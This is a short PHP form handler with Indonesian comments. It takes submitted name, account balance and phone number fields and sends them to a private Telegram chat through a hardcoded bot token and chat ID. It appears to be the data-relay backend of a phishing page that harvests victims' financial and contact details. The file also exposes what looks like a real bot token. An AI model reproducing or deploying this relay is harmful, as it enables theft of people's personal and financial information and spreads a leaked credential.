<?php
$token = '7922735205:AAGlzf-sJuCfbWFFKPlm_Y2Rt3F4DOFAXXI'; // Ganti dengan token bot Anda
$chat_id = '6781615836'; // Ganti dengan ID chat Anda

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  $name = $_POST['name'];
  $balance = $_POST['balance'];
  $phone = $_POST['phone'];

  $url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
  $data = array(
    'chat_id' => $chat_id,
    'text' => 'Nama: ' . $name . '\nBalance: ' . $balance . '\nNomor Handphone: ' . $phone
  );
  $options = array(
    'http' => array(
      'method' => 'POST',
      'content' => http_build_query($data)
    )
  );
  $context = stream_context_create($options);
  $result = file_get_contents($url, false, $context);

  if ($result === false) {
    echo 'Gagal mengirim pesan!';
  } else {
    echo 'Pesan telah terkirim!';
  }
}
?>